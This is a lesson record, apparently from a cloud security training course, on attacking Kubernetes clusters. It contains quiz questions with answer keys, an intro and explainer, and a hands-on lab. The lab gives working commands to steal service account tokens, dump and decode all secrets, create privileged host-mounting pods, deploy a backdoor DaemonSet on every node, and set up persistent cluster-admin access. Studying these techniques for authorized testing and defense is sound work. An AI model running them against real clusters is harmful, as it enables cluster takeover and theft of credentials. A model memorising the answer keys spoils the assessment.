{
  "lesson_id": "e9c0d1e2-a3b4-4c5d-6e7f-8a9b0c1d2e3f",
  "domain": "cloud",
  "title": "Kubernetes Penetration Testing: Attacking K8s Clusters",
  "difficulty": 3,
  "order_index": 125,
  "prerequisites": ["d8b9c0d1-f2a3-4b5c-6d7e-8f9a0b1c2d3e"],
  "concepts": [
    "Kubernetes architecture and attack surface",
    "API server exploitation and authentication bypass",
    "RBAC misconfiguration exploitation",
    "Service account token theft and abuse",
    "Kubelet API unauthorized access",
    "etcd database compromise and secret extraction",
    "Network policy bypass techniques",
    "Admission controller exploitation",
    "Kubernetes dashboard attacks",
    "Cluster-wide privilege escalation"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Kubernetes cluster architecture and components",
    "Exploit Kubernetes API server misconfigurations",
    "Abuse RBAC for privilege escalation",
    "Steal and weaponize service account tokens",
    "Attack kubelet API for node compromise",
    "Extract secrets from etcd database",
    "Bypass network policies for lateral movement",
    "Exploit admission controllers and webhooks",
    "Compromise Kubernetes dashboards",
    "Implement detection and defense for K8s attacks"
  ],
  "post_assessment": [
    {
      "question_id": "k8s-001",
      "question": "What is the MOST critical secret that can be extracted from compromising the etcd database in a Kubernetes cluster?",
      "options": [
        "Application deployment logs and monitoring data",
        "All Kubernetes Secrets including service account tokens and TLS certificates",
        "Container image registry credentials only",
        "Pod resource limits and quotas"
      ],
      "correct_answer": 1,
      "explanation": "The etcd database stores ALL Kubernetes cluster state, including all Secrets (which contain service account tokens, TLS certificates, database passwords, API keys). Compromising etcd gives an attacker complete access to every secret in the cluster, making it the crown jewel target. While etcd contains other data like configs and resource definitions, the Secrets are the most security-critical. With all service account tokens, an attacker can impersonate any service account, including cluster-admin accounts.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "k8s-002",
      "question": "A pod has a service account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. What is the FIRST action an attacker should take?",
      "options": [
        "Delete the token to cover tracks",
        "Use kubectl auth can-i --list to enumerate the service account's permissions",
        "Immediately attempt to create a new cluster-admin user",
        "Deploy a cryptominer across all nodes"
      ],
      "correct_answer": 1,
      "explanation": "The first action should always be reconnaissance - enumerate what permissions the service account has using 'kubectl auth can-i --list'. This reveals what actions are possible before attempting anything that might fail and trigger alerts. Trying to create cluster-admin or deploy miners without knowing permissions will likely fail and generate noise. Deleting the token would lose access. Proper methodology: enumerate â†’ escalate â†’ persist â†’ exploit.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "k8s-003",
      "question": "Which Kubernetes component runs on every node and is often accessible without authentication on port 10250?",
      "options": [
        "kube-apiserver (API server)",
        "kube-controller-manager (controller)",
        "kubelet (node agent)",
        "kube-scheduler (scheduler)"
      ],
      "correct_answer": 2,
      "explanation": "The kubelet is the node agent that runs on every worker node and manages pods. It exposes an API on port 10250 that historically was often unauthenticated. Even with authentication enabled, misconfigurations are common. Compromising kubelet allows executing commands in any pod on that node, reading pod logs and secrets, and potentially escaping to the node itself. The API server, controller-manager, and scheduler run on control plane nodes and have different attack surfaces.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "k8s-004",
      "question": "What is a 'token review' attack in Kubernetes?",
      "options": [
        "Brute-forcing service account tokens to find valid ones",
        "Using the TokenReview API to verify if stolen tokens are still valid",
        "Intercepting token refresh requests to steal new tokens",
        "Analyzing token creation patterns to predict future tokens"
      ],
      "correct_answer": 1,
      "explanation": "A token review attack uses the Kubernetes TokenReview API (usually accessible even with minimal permissions) to validate whether stolen or found tokens are still valid and active. This allows an attacker to test multiple tokens without triggering authentication failures. While brute-forcing is possible in theory, tokens are long random strings making it impractical. The TokenReview API is designed for authentication but can be abused for token validation during attacks.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "k8s-005",
      "question": "Which RBAC permission is MOST dangerous when granted to a service account?",
      "options": [
        "get, list on pods in a single namespace",
        "create, delete on pods with ability to specify serviceAccountName",
        "get, list on secrets in all namespaces",
        "update on configmaps in the default namespace"
      ],
      "correct_answer": 1,
      "explanation": "The ability to create pods with specified serviceAccountName is extremely dangerous because it allows privilege escalation. An attacker can create a pod using a more privileged service account, then exec into that pod to use the higher privileges. Combined with the ability to mount volumes or use privileged mode, this leads directly to cluster compromise. While reading secrets is valuable, creating pods with chosen service accounts allows chaining to any privilege level, including cluster-admin.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Kubernetes Penetration Testing! â˜¸ï¸ðŸ”“\n\nYou're about to master the attack surface of **the most popular container orchestration platform in the world**. Kubernetes runs production workloads for 88% of enterprises, making it the ultimate target for modern attackers.\n\n**Why Kubernetes Matters:**\n\nðŸŽ¯ **Everywhere**: 5.6 million+ developers use Kubernetes (CNCF 2023)\n\nðŸŽ¯ **Critical infrastructure**: Banks, healthcare, government all run on K8s\n\nðŸŽ¯ **High-value targets**: One cluster = hundreds of applications and thousands of secrets\n\nðŸŽ¯ **Complex = vulnerable**: 50+ components, each with unique attack surface\n\n**Real-World Devastation:**\n\nðŸ’¥ **Tesla Cryptomining (2018)**: Unauthenticated Kubernetes dashboard â†’ cluster takeover â†’ cryptominers deployed â†’ thousands in compute costs\n\nðŸ’¥ **Microsoft Azure (2019)**: Kubernetes privilege escalation vulnerability (CVE-2019-11247) â†’ namespace boundary bypass â†’ cross-tenant access\n\nðŸ’¥ **Siloscape Malware (2021)**: First malware targeting Windows containers in K8s â†’ cluster takeover â†’ cloud credential theft\n\nðŸ’¥ **Red Hat OpenShift (2022)**: RBAC bypass (CVE-2022-2385) â†’ unauthorized cluster access\n\n**What You'll Master:**\n\n- Kubernetes architecture and components\n- API server exploitation and auth bypass\n- RBAC privilege escalation paths\n- Service account token weaponization\n- Kubelet API attacks\n- etcd secret extraction\n- Network policy bypass\n- Admission controller exploitation\n- Cluster-wide compromise techniques\n\n**The Kubernetes Challenge:**\n\nKubernetes is **intentionally complex**:\n- 100+ resource types (Pods, Deployments, Services, etc.)\n- 15+ components (API server, scheduler, kubelet, etc.)\n- 4 authentication methods (certs, tokens, OIDC, webhooks)\n- Distributed architecture (control plane + worker nodes)\n- Dynamic network topology (pods created/destroyed constantly)\n\n**This complexity = massive attack surface**\n\n**Why Organizations Fail at K8s Security:**\n\nâŒ \"Kubernetes is secure by default\" (it's NOT)\nâŒ \"We use managed K8s (EKS/AKS/GKE), so we're safe\" (still vulnerable)\nâŒ \"Network policies protect us\" (often misconfigured)\nâŒ \"RBAC is too complex, we'll just use default\" (admin access for everyone!)\n\n**Your Advantage:**\n\nYou've built incredible skills:\n- âœ… Cloud pentesting methodology\n- âœ… Container breakout techniques\n- âœ… Cloud-native application attacks\n- âœ… CI/CD pipeline compromise\n\nNow you're mastering **cluster orchestration attacks** - where containers are managed, secrets are stored, and entire infrastructures can be controlled.\n\n**The Stakes:**\n\nOne compromised Kubernetes cluster:\n- â˜ ï¸ 100s-1000s of applications compromised\n- â˜ ï¸ All secrets exposed (DB passwords, API keys, certificates)\n- â˜ ï¸ Lateral movement to every workload\n- â˜ ï¸ Cloud credentials stolen (AWS/Azure/GCP access)\n- â˜ ï¸ Supply chain poisoning via CI/CD integration\n\n**One cluster = entire organization**\n\n**Career Impact:**\n\nðŸ’¼ **Kubernetes Security Engineer**: $160k-$250k\n\nðŸ› **Bug Bounty**: K8s escapes = $20k-$100k payouts\n\nðŸŽ¯ **Cloud Penetration Tester**: K8s expertise = premium rates\n\nðŸ† **Red Team Leader**: K8s skills essential for modern ops\n\n**What Makes This Advanced:**\n\nKubernetes pentesting requires understanding:\n- Distributed systems architecture\n- Linux namespaces and cgroups\n- Network topology and CNI plugins\n- RBAC and policy engines\n- Certificate-based authentication\n- etcd consensus protocols\n\n**This is expert-level security knowledge.**\n\n**Your Mission:**\n\nBy the end of this lesson, you'll think like attackers who:\n- Compromised Tesla's Kubernetes infrastructure\n- Found critical CVEs in Kubernetes core\n- Bypassed enterprise K8s security controls\n- Achieved cluster-admin from unprivileged pods\n\n**Remember**: These techniques are for authorized penetration testing, red team operations, and security research only. Unauthorized access is illegal.\n\nLet's dominate Kubernetes security! ðŸš€ðŸ’ª"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What Is Kubernetes?\n\nImagine you run a massive toy factory with 1,000 different toy-making robots. How do you manage them all?\n\n**Without Kubernetes = Manual Management (Chaos!)**\n\nYou have to:\n- Remember which robot makes which toy\n- Manually turn robots on when toys are needed\n- Manually turn robots off to save power\n- If a robot breaks, manually replace it\n- If demand increases, manually add more robots\n- If toys pile up, manually slow down production\n\n**With Kubernetes = Robot Factory Manager (Automated!)**\n\nYou tell Kubernetes:\n- \"I need 10 teddy bear robots running always\"\n- \"If demand increases, add more robots automatically\"\n- \"If a robot breaks, replace it instantly\"\n- \"Distribute robots across the factory evenly\"\n- \"Only let certain robots access the supply room\"\n\n**Kubernetes manages everything automatically!**\n\n### What Is Kubernetes Really?\n\n**Kubernetes** (K8s) is a **container orchestration system**:\n\nðŸ­ **Orchestration** = Managing many things working together\n\nðŸ“¦ **Containers** = Packaged applications (Docker containers)\n\nðŸ¤– **System** = Software that automates management\n\n**In simple terms**: Kubernetes is the **factory manager** for containers.\n\n### Kubernetes Architecture (Toy Factory Analogy)\n\n```\nðŸ¢ FACTORY (Kubernetes Cluster)\n   â”œâ”€â”€ ðŸ§‘â€ðŸ’¼ MANAGERS (Control Plane)\n   â”‚   â”œâ”€â”€ CEO (API Server)        â†’ Takes orders, makes decisions\n   â”‚   â”œâ”€â”€ Scheduler               â†’ Decides which robot goes where\n   â”‚   â”œâ”€â”€ Controller Manager      â†’ Ensures robots keep working\n   â”‚   â””â”€â”€ Database (etcd)         â†’ Remembers everything\n   â”‚\n   â””â”€â”€ ðŸ­ FACTORY FLOORS (Worker Nodes)\n       â”œâ”€â”€ Floor #1 (Node 1)\n       â”‚   â”œâ”€â”€ Floor Manager (kubelet) â†’ Runs the robots on this floor\n       â”‚   â””â”€â”€ ðŸ¤– Robots (Pods/Containers)\n       â”œâ”€â”€ Floor #2 (Node 2)\n       â”‚   â”œâ”€â”€ Floor Manager (kubelet)\n       â”‚   â””â”€â”€ ðŸ¤– Robots (Pods/Containers)\n       â””â”€â”€ Floor #3 (Node 3)\n           â”œâ”€â”€ Floor Manager (kubelet)\n           â””â”€â”€ ðŸ¤– Robots (Pods/Containers)\n```\n\n### Key Kubernetes Concepts\n\n**1. Pod = A Group of Robots Working Together**\n\nA **Pod** is the smallest unit in Kubernetes:\n- Usually 1 container, sometimes 2-3 working together\n- Like a \"team\" of robots\n- Example: Web server + logging agent in one Pod\n\n**2. Service = The Reception Desk**\n\nA **Service** routes requests to the right Pods:\n- Like a receptionist directing visitors\n- \"You want teddy bears? Go to Pod #3!\"\n- Provides stable address even as Pods change\n\n**3. Deployment = Production Instructions**\n\nA **Deployment** says:\n- \"Always run 10 teddy bear robots\"\n- \"If one breaks, replace it\"\n- \"When updating, do it gradually\"\n\n**4. Secret = Locked Safe**\n\nA **Secret** stores sensitive info:\n- Database passwords\n- API keys\n- Certificates\n- Like a locked safe in the manager's office\n\n**5. ServiceAccount = Employee Badge**\n\nA **ServiceAccount** is an identity:\n- Each robot has a badge\n- Badge says what the robot can do\n- \"This badge lets you enter the supply room\"\n\n**6. RBAC = Permission Rules**\n\n**RBAC** (Role-Based Access Control):\n- \"Only senior robots can access expensive materials\"\n- \"Junior robots can only make simple toys\"\n- \"Managers can control all robots\"\n\n### Why Do Bad Guys Attack Kubernetes?\n\n**Problem 1: The CEO's Office Is Sometimes Unlocked (API Server)**\n\nThe **API Server** is like the CEO's office - it controls everything:\n- If you get into the CEO's office, you control the whole factory\n- Sometimes the door is unlocked (no authentication)\n- Sometimes the lock is weak (misconfigured RBAC)\n\n**Attack**: Break into API server â†’ control entire cluster\n\n**Problem 2: Employee Badges Are Lying Around (Service Account Tokens)**\n\nEvery robot has a badge (service account token):\n- Badges are stored inside the robots themselves\n- If you control a robot, you steal its badge\n- If the badge has high privileges, you become a manager!\n\n**Attack**: Compromise Pod â†’ steal token â†’ escalate privileges\n\n**Problem 3: The Database Has No Guard (etcd)**\n\nThe factory **database (etcd)** stores everything:\n- All passwords and secret codes\n- All badges and permissions\n- All factory blueprints\n- Often accessible without authentication!\n\n**Attack**: Access etcd â†’ read all secrets â†’ game over\n\n**Problem 4: Floor Managers Trust Everyone (kubelet)**\n\nEach **floor manager (kubelet)** controls robots on their floor:\n- Sometimes they don't check IDs\n- Anyone can tell them to run new robots\n- Anyone can ask them to read robot memory\n\n**Attack**: Access kubelet API â†’ execute commands in any Pod\n\n**Problem 5: Junior Robots Can Become Managers (RBAC Misconfiguration)**\n\nPermission rules (RBAC) are complicated:\n- \"Junior robot can create new robots\"\n- Junior robot creates a MANAGER robot\n- Junior robot controls manager robot\n- Junior robot is now effectively a manager!\n\n**Attack**: Abuse RBAC â†’ privilege escalation â†’ cluster-admin\n\n**Problem 6: Robots Can Leave Their Workstations (Container Escape)**\n\nRobots should stay in their workstations:\n- But sometimes they can escape\n- Once outside, they can:\n  - Access other robots\n  - Steal credentials from floor managers\n  - Access the whole factory floor\n\n**Attack**: Container escape â†’ node access â†’ cluster compromise\n\n### Real Attack Example: Tesla Kubernetes Hack (2018)\n\n**The Story (Toy Factory Version):**\n\n1. **Bad guys found the CEO's office unlocked** (Kubernetes dashboard with no password)\n2. **They walked right in** (accessed dashboard from internet)\n3. **They looked at the employee directory** (enumerated all Pods and Secrets)\n4. **They found the safe combination** (AWS credentials in Secrets)\n5. **They hired fake robots** (deployed cryptominers)\n6. **Fake robots made money for bad guys** (mined cryptocurrency)\n7. **Tesla got a huge electric bill** (thousands in compute costs)\n\n**Technical Translation:**\n- Exposed Kubernetes dashboard without authentication\n- Attackers accessed dashboard from internet\n- Enumerated cluster resources\n- Found AWS credentials in Kubernetes Secrets\n- Deployed cryptomining pods across cluster\n- Used Tesla's compute for profit\n- Tesla discovered due to billing anomaly\n\n### How Do We Secure the Toy Factory (Kubernetes)?\n\n**1. Lock the CEO's Office (Secure API Server)**\n- Require strong authentication\n- Enable RBAC (proper permission rules)\n- Don't expose to internet\n- Monitor all access\n\n**2. Control Employee Badges (Limit ServiceAccount Permissions)**\n- Junior robots get junior badges only\n- Only managers get manager badges\n- Regular audits of who has which badge\n- Automatic badge expiration\n\n**3. Guard the Database (Secure etcd)**\n- Require authentication\n- Encrypt all data\n- Isolate from network\n- Regular backups\n\n**4. Train Floor Managers (Secure kubelet)**\n- Check IDs before accepting commands\n- Encrypt communication\n- Limit what can be done\n- Log all actions\n\n**5. Simplify Permission Rules (Fix RBAC)**\n- Use principle of least privilege\n- Regular permission audits\n- Remove unused badges\n- Test permission boundaries\n\n**6. Keep Robots in Their Workstations (Container Security)**\n- Use security policies (Pod Security Standards)\n- Don't allow privileged robots\n- Limit what robots can access\n- Monitor escape attempts\n\n---\n\n**Bottom Line:**\n\nKubernetes is like a toy factory with:\n- ðŸ¢ **Managers (control plane)** who make decisions\n- ðŸ­ **Factory floors (nodes)** where work happens\n- ðŸ¤– **Robots (Pods)** that do the actual work\n- ðŸŽ« **Badges (service accounts)** that control permissions\n- ðŸ—„ï¸ **Database (etcd)** that stores everything\n\nBad guys attack Kubernetes by:\n- Breaking into the CEO's office (API server)\n- Stealing employee badges (service account tokens)\n- Reading the database without permission (etcd)\n- Tricking floor managers (kubelet)\n- Exploiting permission mistakes (RBAC)\n\nYour job? Either **break in** (pentesting) or **keep bad guys out** (defense)!\n\nLet's learn both! â˜¸ï¸ðŸ”’"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab 1: Service Account Token Theft and Privilege Escalation\n\nEvery Pod in Kubernetes automatically gets a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This token is the key to the cluster.\n\n### Attack Scenario\n\nYou've compromised a Pod in a Kubernetes cluster (via application vulnerability, RCE, etc.). Your goal: Steal the service account token and escalate privileges.\n\n### Step 1: Verify You're Inside a Kubernetes Pod\n\n```bash\n# Check for Kubernetes service account token\nif [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then\n  echo \"[+] Running inside Kubernetes pod!\"\n  echo \"[+] Service account token found\"\nelse\n  echo \"[-] Not in a Kubernetes pod\"\n  exit 1\nfi\n\n# Extract key information\nNAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nAPIURL=\"https://kubernetes.default.svc\"\n\necho \"[+] Namespace: $NAMESPACE\"\necho \"[+] Token: ${TOKEN:0:50}...\"\necho \"[+] API URL: $APIURL\"\n```\n\n### Step 2: Test API Server Connectivity\n\n```bash\n# Test connection to API server\nCA_CERT=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"\n\ncurl -s --cacert $CA_CERT \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  $APIURL/api/v1/namespaces/$NAMESPACE/pods\n\n# If you get JSON response, you have connectivity!\n```\n\n### Step 3: Enumerate Service Account Permissions\n\n```bash\n# Install kubectl if not present\nif ! command -v kubectl &> /dev/null; then\n  echo \"[+] Installing kubectl...\"\n  curl -LO \"https://dl.k8s.io/release/v1.28.0/bin/linux/amd64/kubectl\"\n  chmod +x kubectl\n  mv kubectl /usr/local/bin/\nfi\n\n# Configure kubectl to use service account token\nkubectl config set-cluster k8s --server=$APIURL --certificate-authority=$CA_CERT\nkubectl config set-credentials sa --token=$TOKEN\nkubectl config set-context k8s --cluster=k8s --user=sa --namespace=$NAMESPACE\nkubectl config use-context k8s\n\n# Enumerate permissions\necho \"[+] Enumerating service account permissions...\"\nkubectl auth can-i --list\n\n# Check specific high-value permissions\necho \"\\n[+] Checking critical permissions:\"\nkubectl auth can-i get secrets\nkubectl auth can-i create pods\nkubectl auth can-i get pods\nkubectl auth can-i exec pods\n```\n\n### Step 4: Extract Secrets (If Permitted)\n\n```bash\n# If you have 'get secrets' permission\necho \"[+] Attempting to extract secrets...\"\n\n# List all secrets in current namespace\nkubectl get secrets\n\n# Extract specific secret\nSECRET_NAME=\"app-database-credentials\"\nkubectl get secret $SECRET_NAME -o json | jq -r '.data'\n\n# Decode secret values (they're base64 encoded)\nkubectl get secret $SECRET_NAME -o json | jq -r '.data.password' | base64 -d\nkubectl get secret $SECRET_NAME -o json | jq -r '.data.username' | base64 -d\n\n# Extract ALL secrets in namespace\nfor secret in $(kubectl get secrets -o name); do\n  echo \"\\n[+] Secret: $secret\"\n  kubectl get $secret -o json | jq -r '.data' | jq -r 'to_entries[] | \"\\(.key) = \\(.value | @base64d)\"'\ndone\n```\n\n### Step 5: Privilege Escalation via Pod Creation\n\nIf you have `create pods` permission, you can escalate privileges:\n\n**Technique A: Create Pod with Privileged Service Account**\n\n```yaml\n# Create priv-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privilege-escalation-pod\n  namespace: default\nspec:\n  serviceAccountName: admin-service-account  # Target high-privilege SA\n  containers:\n  - name: attacker\n    image: alpine:latest\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"sleep 3600\"]\n```\n\n```bash\n# Apply privileged pod\nkubectl apply -f priv-pod.yaml\n\n# Wait for pod to be ready\nkubectl wait --for=condition=Ready pod/privilege-escalation-pod\n\n# Exec into privileged pod\nkubectl exec -it privilege-escalation-pod -- /bin/sh\n\n# Inside privileged pod, you now have admin-service-account token!\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# Repeat enumeration with higher privileges\nkubectl auth can-i --list\n# Now you may have cluster-admin!\n```\n\n**Technique B: Create Privileged Pod with Host Access**\n\n```yaml\n# Create host-access-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: host-access-pod\nspec:\n  hostNetwork: true  # Use host network\n  hostPID: true      # See host processes\n  hostIPC: true      # Use host IPC\n  containers:\n  - name: attacker\n    image: alpine:latest\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"sleep 3600\"]\n    securityContext:\n      privileged: true  # Privileged mode\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /  # Mount host root filesystem\n      type: Directory\n```\n\n```bash\n# Apply host access pod\nkubectl apply -f host-access-pod.yaml\n\n# Exec into pod\nkubectl exec -it host-access-pod -- /bin/sh\n\n# You now have full host access!\ncd /host\nchroot /host /bin/bash\n\n# You're root on the host node!\nid\n# uid=0(root) gid=0(root)\n\nhostname\n# node-worker-01\n\n# Access host secrets\ncat /host/var/lib/kubelet/kubeconfig\ncat /host/etc/kubernetes/admin.conf\n```\n\n### Step 6: Cluster-Wide Compromise\n\nOnce you have cluster-admin or node access:\n\n```bash\n# List all namespaces\nkubectl get namespaces\n\n# Extract secrets from ALL namespaces\nfor ns in $(kubectl get ns -o name | cut -d/ -f2); do\n  echo \"\\n[+] Namespace: $ns\"\n  kubectl get secrets -n $ns -o json | \\\n    jq -r '.items[] | \"Secret: \\(.metadata.name)\\n\\(.data)\"'\ndone\n\n# Find service accounts with cluster-admin\nkubectl get clusterrolebindings -o json | \\\n  jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") | .subjects[]'\n\n# Deploy backdoor across all nodes\ncat <<EOF | kubectl apply -f -\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: backdoor\nspec:\n  selector:\n    matchLabels:\n      app: backdoor\n  template:\n    metadata:\n      labels:\n        app: backdoor\n    spec:\n      hostNetwork: true\n      hostPID: true\n      containers:\n      - name: backdoor\n        image: attacker/backdoor:latest\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host\n          mountPath: /host\n      volumes:\n      - name: host\n        hostPath:\n          path: /\nEOF\n\n# Backdoor now runs on EVERY node!\n```\n\n### Step 7: Persistence\n\n```bash\n# Create persistent admin service account\nkubectl create serviceaccount persistent-admin\n\n# Bind to cluster-admin role\nkubectl create clusterrolebinding persistent-admin-binding \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=default:persistent-admin\n\n# Extract token\nTOKEN=$(kubectl create token persistent-admin --duration=87600h)  # 10 years\n\necho \"[+] Persistent token (save this!):\"\necho $TOKEN\n\n# Create kubeconfig for external access\ncat > ~/.kube/config <<EOF\napiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    server: https://cluster-api-endpoint:6443\n    insecure-skip-tls-verify: true\n  name: compromised-cluster\ncontexts:\n- context:\n    cluster: compromised-cluster\n    user: persistent-admin\n  name: compromised\ncurrent-context: compromised\nusers:\n- name: persistent-admin\n  user:\n    token: $TOKEN\nEOF\n\necho \"[+] Persistent access configured!\"\necho \"[+] Can now access cluster from anywhere with this kubeconfig\"\n```\n\n### Defense and Detection\n\n**Detection Queries:**\n\n```bash\n# Audit: Find pods with powerful service accounts\nkubectl get pods --all-namespaces -o json | \\\n  jq -r '.items[] | \"\\(.metadata.namespace)/\\(.metadata.name) â†’ \\(.spec.serviceAccountName)\"' | \\\n  grep -E \"admin|system\"\n\n# Audit: Find privileged pods\nkubectl get pods --all-namespaces -o json | \\\n  jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n\n# Audit: Find pods with hostPath mounts\nkubectl get pods --all-namespaces -o json | \\\n  jq -r '.items[] | select(.spec.volumes[]?.hostPath!=null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n```\n\n**Prevention:**\n\n```yaml\n# Use Pod Security Standards (restricted)\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: production\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\n\n---\n# Limit default service account permissions\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: default\nautomountServiceAccountToken: false  # Disable auto-mounting\n```\n\n### Your Turn: Practice Lab\n\n**Objective**: Escalate from unprivileged pod to cluster-admin.\n\n**Setup:**\n```bash\n# Create test cluster (minikube or kind)\nminikube start\n\n# Deploy vulnerable pod\nkubectl run test-pod --image=alpine:latest -- sleep 3600\nkubectl exec -it test-pod -- /bin/sh\n```\n\n**Tasks:**\n1. Extract service account token\n2. Enumerate permissions\n3. Find secrets in namespace\n4. Create privileged pod if possible\n5. Escalate to node access\n6. Extract cluster-admin credentials\n7. Establish persistence\n\n**Success Criteria:**\n- Successfully enumerate SA permissions\n- Extract at least one secret\n- Create a privileged pod\n- Achieve cluster-admin access\n- Create persistent backdoor\n\n**Remember**: Only practice in authorized lab environments!"
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Pentester",
    "Career Path: Red Teamer"
  ]
}
